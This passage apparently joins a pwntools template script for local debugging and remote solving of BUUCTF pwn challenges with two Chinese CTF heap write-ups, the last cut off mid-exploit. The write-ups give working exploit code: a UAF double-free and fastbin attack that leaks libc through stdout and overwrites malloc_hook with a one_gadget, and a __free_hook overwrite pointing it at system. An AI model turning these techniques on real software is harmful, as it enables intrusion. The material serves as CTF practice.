这是专门为本地调试与远程答题准备的脚本，依靠命令行参数进行控制。本脚本支持的功能有： 本地调试 开启tmux调试 设置gdb断点，支持函数名断点、地址断点、文件名:行号断点、$rebase(0x00)断点 设置gdb script，可以设置任何内置的gdb命令 远程答题 默认支持buuctf，只需要指定远程port 显式指定远程ip和port 使用的装饰器函数、偏函数 在执行函数前、后线程休眠指定秒数 记录函数执行日志 int16，字符串与整数转化 可自由定制 依托click模块进行自由定制 脚本内容#!/usr/bin/python3# -*- encoding: utf-8 -*-# @File : do_pwn_template.py# @Time : 2021/04/02 21:15:43# @Author : Roderick Chan# @Email : ch22166@163.com# @Desc : pwn题本地调试、远程攻击脚本'''==========================================================================================本脚本为pwn题所编写，利用click模块配置命令行参数，能方便地进行本地调试和远程解题。本地命令示例： python3 exp.py filename --tmux 1 --gdb-breakpoint 0x804802a --gdb-breakpoint printf python3 exp.py filename -t 1 -gb 0x804802a -gb printf python3 exp.py filename -t 1 -gs &quot;x /12gx \$rebase(0x202080)&quot; -sf 0 -pl &quot;warn&quot; 即可开始本地调试,并且会断在地址或函数处。先启动tmux后，--tmux才会有效。远程命令示例： python3 exp.py filename -i 127.0.0.1 -p 22164 python3 exp.py filename -p 22164 可以连接指定的IP和端口。目前在刷buuctf上的题，所以填了默认ip，只指定端口即可。=========================================================================================='''from pwn import *from LibcSearcher import LibcSearcherimport clickimport sysimport osimport timeimport functoolsprint(__doc__)FILENAME = '#' # 要执行的文件名DEBUG = 1 # 是否为调试模式TMUX = 0 # 是否开启TMUXGDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置GDB_SCRIPT = None # 当tmux开启的时候, gdb_script的设置，可以是任意有效的语句IP = None # 远程连接的IPPORT = None # 远程连接的端口LOCAL_LOG = 1 # 本地LOG是否开启PWN_LOG_LEVEL = 'debug' # pwntools的log级别设置STOP_FUNCTION = 1 # STOP方法是否开启CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])@click.command(context_settings=CONTEXT_SETTINGS, short_help='Do pwn!')@click.argument('filename', nargs=1, type=str, required=0, default=None)@click.option('-d', '--debug', default=True, type=bool, nargs=1, help='Excute program at local env or remote env. Default value: True.')@click.option('-t', '--tmux', default=False, type=bool, nargs=1, help='Excute program at tmux or not. Default value: False.')@click.option('-gb', '--gdb-breakpoint', default=[], type=str, multiple=True, help=&quot;Set a gdb breakpoint while tmux is enabled, is a hex address or '\$rebase' addr or a function name. Multiple setting supported. Default value:'[]'&quot;)@click.option('-gs', '--gdb-script', default=None, type=str, help=&quot;Set a gdb script while tmux is enabled, the script will be passed to gdb and use '\n' or ';' to split lines. Default value:None&quot;)@click.option('-i', '--ip', default=None, type=str, nargs=1, help='The remote ip addr. Default value: None.')@click.option('-p', '--port', default=None, type=int, nargs=1, help='The remote port. Default value: None.')@click.option('-ll', '--local-log', default=True, type=bool, nargs=1, help='Set local log enabled or not. Default value: True.')@click.option('-pl', '--pwn-log', type=click.Choice(['debug', 'info', 'warn', 'error', 'notset']), nargs=1, default='debug', help='Set pwntools log level. Default value: debug.')@click.option('-sf', '--stop-function', default=True, type=bool, nargs=1, help='Set stop function enabled or not. Default value: True.')def parse_command_args(filename, debug, tmux, gdb_breakpoint, gdb_script, ip, port, local_log, pwn_log, stop_function): '''FILENAME: The filename of current directory to pwn''' global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, GDB_SCRIPT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION # assign FILENAME = filename DEBUG = debug TMUX = tmux GDB_BREAKPOINT = gdb_breakpoint GDB_SCRIPT = gdb_script IP = ip PORT = port LOCAL_LOG = local_log PWN_LOG_LEVEL = pwn_log STOP_FUNCTION = stop_function # change if PORT: # 远程下这些是需要关闭的 DEBUG = 0 TMUX = 0 STOP_FUNCTION = 0 GDB_BREAKPOINT = None GDB_SCRIPT = None if IP is None: IP = 'node3.buuoj.cn' if DEBUG: IP = None PORT = None # assert assert not (FILENAME is None and PORT is None), 'para error' assert not (FILENAME is None and DEBUG == 1), 'para error' assert not (PORT is not None and DEBUG == 1), 'para error' assert not (DEBUG == 0 and TMUX == 1), 'para error' # print click.echo('=' * 50) click.echo(' [+] Args info:
') if FILENAME: click.echo(' filename: %s' % FILENAME) click.echo(' debug enabled: %d' % DEBUG) click.echo(' tmux enabled: %d' % TMUX) if GDB_BREAKPOINT: click.echo(' gdb breakpoint: {}'.format(GDB_BREAKPOINT)) if GDB_SCRIPT: click.echo(&quot; gdb script: {}&quot;.format(GDB_SCRIPT)) if IP: click.echo(' remote ip: %s' % IP) if PORT: click.echo(' remote port: %d' % PORT) click.echo(' local log enabled: %d' % LOCAL_LOG) click.echo(' pwn log_level: %s' % PWN_LOG_LEVEL) click.echo(' stop function enabled: %d' % STOP_FUNCTION) click.echo('=' * 50) parse_command_args.main(standalone_mode=False)# 退出条件，只要参数有 -h 或 --help就退出if len(sys.argv) &gt; 1: for arg in sys.argv: if '-h' == arg or '--help' == arg: sys.exit(0)if DEBUG: io = process('{}'.format(FILENAME))else: io = remote(IP, PORT)if TMUX: context.update(terminal=['tmux', 'splitw', '-h']) tmp_all_gdb = &quot;&quot; if GDB_BREAKPOINT is not None or len(GDB_BREAKPOINT) &gt; 0: # 解析每一条gdb-breakpoint for gb in GDB_BREAKPOINT: if gb.startswith('0x') or gb.startswith('$rebase('): tmp_all_gdb += &quot;b *{}
&quot;.format(gb) # 带上* else: # 传入函数 tmp_all_gdb += &quot;b {}
&quot;.format(gb) # 不带* if GDB_SCRIPT is not None: tmp_all_gdb += GDB_SCRIPT.replace(&quot;\n&quot;, &quot;
&quot;).replace(&quot;;&quot;, &quot;
&quot;) + &quot;
&quot; tmp_all_gdb += &quot;c
&quot; gdb.attach(io, gdbscript=tmp_all_gdb)if FILENAME: cur_elf = ELF('{}'.format(FILENAME)) print('[+] libc used ===&gt; {}'.format(cur_elf.libc))def LOG_ADDR(addr_name:str, addr:int): if LOCAL_LOG: log.success(&quot;{} ===&gt; {}&quot;.format(addr_name, hex(addr))) else: passdef LOG_ADDR_EX(addr_name:str): ''' 存储地址的变量名，字符串 如：a = 0xdeadbeef 调用: LOG_ADDR_EX('a') ''' if LOCAL_LOG: # 利用eval函数, 首先检索一下 if addr_name in globals() or addr_name in vars(): tmp_var = eval(addr_name) log.success(&quot;{} ===&gt; {}&quot;.format(addr_name, hex(tmp_var))) else: log.warn(&quot;No variable named: '&quot; + addr_name + &quot;'&quot;) else: pass def STOP(): if not STOP_FUNCTION: return print(&quot;stop...{} {}&quot;.format(sys._getframe().f_lineno, proc.pidof(io))) pause()############### 定义一些偏函数 ###################int16 = functools.partial(int, base=16)#################### END ####################################### 定义一些装饰器函数 ###############def time_count(func): ''' 装饰器：统计函数运行时间 ''' @functools.wraps(func) def wrapper(*args, **kwargs): print('=' * 50) print('function #{}# start...'.format(func.__name__)) start = time.time() res = func(*args, **kwargs) end = time.time() print('function #{}# end...execute time: {} s / {} min'.format(func.__name__, end - start, (end - start) / 60)) return res return wrapperdef sleep_call(second:int=1, mod:int=1): &quot;&quot;&quot; 装饰器：在调用函数前后线程先睡眠指定秒数 Args: second: 休眠秒数 mod: 0 不休眠; 1 为调用前休眠; 2 为调用后休眠; 3 为前后均修眠 &quot;&quot;&quot; if mod &gt; 3 or mod &lt; 0: mod = 1 def wrapper1(func): @functools.wraps(func) def wrapper2(*args, **kwargs): if mod &amp; 1: time.sleep(second) res = func(*args, **kwargs) if mod &amp; 2: time.sleep(second) return res return wrapper2 return wrapper1 #################### END ########################context.update(log_level=PWN_LOG_LEVEL)# 一般需要带上文件，可注释改行语句assert FILENAME is not None, 'give me a file!'################################################################以下为攻击代码######################################################################### 使用使用详情基本在注释里面写得很清楚了，这里展示一下输入python exp.py -h后显示的帮助信息： 笔记本屏幕有点小······ 以下为全部显示内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950==========================================================================================本脚本为pwn题所编写，利用click模块配置命令行参数，能方便地进行本地调试和远程解题。本地命令示例： python3 exp.py filename --tmux 1 --gdb-breakpoint 0x804802a --gdb-breakpoint printf python3 exp.py filename -t 1 -gb 0x804802a -gb printf python3 exp.py filename -t 1 -gs &quot;x /12gx $rebase(0x202080)&quot; -sf 0 -pl &quot;warn&quot; 即可开始本地调试,并且会断在地址或函数处。先启动tmux后，--tmux才会有效。远程命令示例： python3 exp.py filename -i 127.0.0.1 -p 22164 python3 exp.py filename -p 22164 可以连接指定的IP和端口。目前在刷buuctf上的题，所以填了默认ip，只指定端口即可。==========================================================================================Usage: do_pwn_template.py [OPTIONS] [FILENAME] FILENAME: The filename of current directory to pwnOptions: -d, --debug BOOLEAN Excute program at local env or remote env. Default value: True. -t, --tmux BOOLEAN Excute program at tmux or not. Default value: False. -gb, --gdb-breakpoint TEXT Set a gdb breakpoint while tmux is enabled, is a hex address or '$rebase' addr or a function name. Multiple setting supported. Default value:'[]' -gs, --gdb-script TEXT Set a gdb script while tmux is enabled, the script will be passed to gdb and cannot be identified with gdb-breakpoint simultaneously. Default value:None -i, --ip TEXT The remote ip addr. Default value: None. -p, --port INTEGER The remote port. Default value: None. -ll, --local-log BOOLEAN Set local log enabled or not. Default value: True. -pl, --pwn-log [debug|info|warn|error|notset] Set pwntools log level. Default value: debug. -sf, --stop-function BOOLEAN Set stop function enabled or not. Default value: True. -h, --help Show this message and exit. 使用示例本地调试：输入：python3 exp.py ./ycb_2020_babypwn -t 1 -gs &quot;b malloc
b free&quot;自动下断点malloc和free输入：python3 exp.py ./ycb_2020_babypwn -t 1 -gb &quot;\$rebase(0xc1f)&quot;，这里要加上转义字符，否会失败。的确断住了。远程攻击：输入：python3 exp.py ./ycb_2020_babypwn -i &quot;127.0.0.1&quot; -p 6666 参考与引用 click帮助文档：https://click.palletsprojects.com/en/7.x/ pwntools帮助文档：https://docs.pwntools.com/en/latest/

总结本题与这篇文章或者这篇文章的思路是一模一样的，但是由于有个eidt功能，所以利用起来更方便。主要思路是： 构造fastbin和unsorted bin的overlapped chunk 爆破1个字节，利用fastbin attack分配chunk到stdout结构体上方，泄露libc地址 利用fastbin attack分配到malloc_hook上方，利用realloc_hook调整栈帧，使用one_gadget去getshell 题目分析checksec 保护全开，libc使用2.23。 关键函数分析delete_weapon 有一个UAF漏洞，可以利用fastbin double free来构造出overlapped chunk。 利用思路利用步骤： 利用UAF漏洞构造出overlapped fastbin chunk，布局为A---&gt;B---&gt;A 踩chunk A的fd的低字节，申请chunk到B的上方 修改B的chunk size为0x91 构造fastbin chunk和unsorted chunk重合的堆布局 分配fake chunk到stdout结构体上方泄露libc地址，这里需要爆破1个字节 利用realloc_hook + malloc_hook + one_gadget获取shell EXP完整exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *import functoolsLOG_ADDR = lambda x, y: log.success('{} ===&gt; {}'.format(x, hex(y)))int16 = functools.partial(int, base=16)context.update(arch='amd64', os='linux', endian='little')def create_weapon(size:int, idx:int, name, sh:tube): sh.sendlineafter(&quot;choice &gt;&gt; 
&quot;, '1') sh.sendlineafter(&quot;wlecome input your size of weapon: &quot;, str(size)) sh.sendlineafter(&quot;input index: &quot;, str(idx)) sh.sendafter(&quot;input your name:
&quot;, name)def delete_weapon(idx, sh:tube): sh.sendlineafter(&quot;choice &gt;&gt; 
&quot;, '2') sh.sendlineafter(&quot;input idx :&quot;, str(idx))def rename_weapon(idx, name, sh:tube): sh.sendlineafter(&quot;choice &gt;&gt; 
&quot;, '3') sh.sendlineafter(&quot;input idx: &quot;, str(idx)) sh.sendafter(&quot;new content:
&quot;, name)def attack(malloc_hook_offset = 0x3c4b10, gadget = 0x4527a, realloc_offset = 0x84710, low_2th_byte=b'\xe5', sh:tube=None): create_weapon(0x60, 0, p64(0x71) * 10 + p64(0) + p64(0x71), sh) create_weapon(0x60, 1, p64(0x71) * 12, sh) create_weapon(0x60, 2, p64(0x51) * 12, sh) delete_weapon(0, sh) delete_weapon(1, sh) delete_weapon(0, sh) create_weapon(0x60, 3, b'\x50', sh) create_weapon(0x60, 3, b'\x50', sh) create_weapon(0x60, 3, b'\x50', sh) create_weapon(0x60, 4, 'a', sh) delete_weapon(1, sh) rename_weapon(4, p64(0x71) * 3 + p64(0x91), sh) delete_weapon(1, sh) rename_weapon(4, p64(0x71) * 3 + p64(0x71) + b'\xdd' + low_2th_byte, sh) create_weapon(0x60, 3, b'\x00', sh) create_weapon(0x60, 5, 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58', sh) leak_libc_addr = u64(sh.recvn(8)) LOG_ADDR('leak_libc_addr', leak_libc_addr) libc_base_addr = leak_libc_addr - 0x3c56a3 LOG_ADDR('libc_base_addr', libc_base_addr) delete_weapon(1, sh) rename_weapon(4, p64(0x71) * 3 + p64(0x71) + p64(libc_base_addr + malloc_hook_offset - 0x23), sh) create_weapon(0x60, 3, 'a', sh) create_weapon(0x60, 3, 0xb * b'a' + p64(libc_base_addr + gadget) + p64(libc_base_addr + realloc_offset + 0xd), sh) sh.sendlineafter(&quot;choice &gt;&gt; 
&quot;, '1') sh.sendlineafter(&quot;wlecome input your size of weapon: &quot;, str(64)) sh.sendlineafter(&quot;input index: &quot;, str(0)) sh.sendline('id') sh.recvline_contains(b'uid', timeout=1) sh.interactive()if __name__ == '__main__': sh = None while True: try: sh = remote('node3.buuoj.cn', 25668) attack(realloc_offset=0x846c0, gadget=0x4526a, sh=sh) except: try: sh.close() except: pass 效果展示

总结本题比较简单，就是题目流程比较复杂一点，用到的知识点就一个： 当chunk被放置到unsorted bin中时，其fd指针会指向main_arena+88这个地址，可以用来泄露libc地址 checksec 保护全开，题目运行环境为ubuntu 16.04， libc-2.23.so。 题目分析题目实现了对书的管理，包括章节、主题等。书所需要的内存都是从堆上分配的。 首先，分配0x90大小的内存，存放书的信息，结构如下： 然后，每一个章节的结构，也是0x90大小的chunk，内存布局如下： 然后每个section都是大小为0x40的chunk，其内存布局如下： text_ptr对应的大小由用户指定，输入大小不超过0x100 漏洞分析漏洞点有4处，有两处在add_text函数中： 第40行可以输入负数绕过校验，第45和47行，如果输入小于0x100的正数，则会越界写。 第三处在remove_section函数中： 这里存在一个UAF漏洞。 第四出在updapte函数中： 同样是会越界写，指定了写的大小为0x100。 其实还有一个，就是我标注的read_off_by_one函数，会越界写一个字节。但是也要注意，这个函数里有memset(addr, 0, len)，会把内存置为0。 利用思路利用思路很多，因为题目漏洞给得实在是太多了，分享我的利用过程如下： 分配一个0x100大小的chunk，作为一个存储text的内存块，前面紧挨着一个0x90的内存块，可以被用作chapter 使用掉高地址的chapter，然后update低地址的text块。由于会把0xff的内存刷为0，所以必须要构造0x100大小的text内存块。直接填满0x100个a后。 使用book_preview，就会打印出unsorted bin的fd内容，得到libc地址 用update的越界写，修改某个section的text_ptr指针，修改为__free_hook的地址 然后update那个section的text，就是在往__free_hook写内容，填上system地址 释放带有/bin/sh的内存块，即可获得shell 最终EXP泄露地址： 修改text_ptr： 修改__free_hook为system地址： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115from pwn import *LOG_ADDR = lambda x, y: info(&quot;{} ===&gt; {}&quot;.format(x, hex(y)))sh = process(&quot;./pwn&quot;)libc = ELF('libc-2.23.so')context.update(arch=&quot;amd64&quot;, os=&quot;linux&quot;, endian=&quot;little&quot;)def add_book(book_name): sh.sendlineafter(&quot;Name of the book you want to create: &quot;, book_name)def add_chapter(chapter_name=&quot;abc&quot;): assert len(chapter_name) &lt;= 20, &quot;len error!&quot; sh.sendlineafter(&quot;
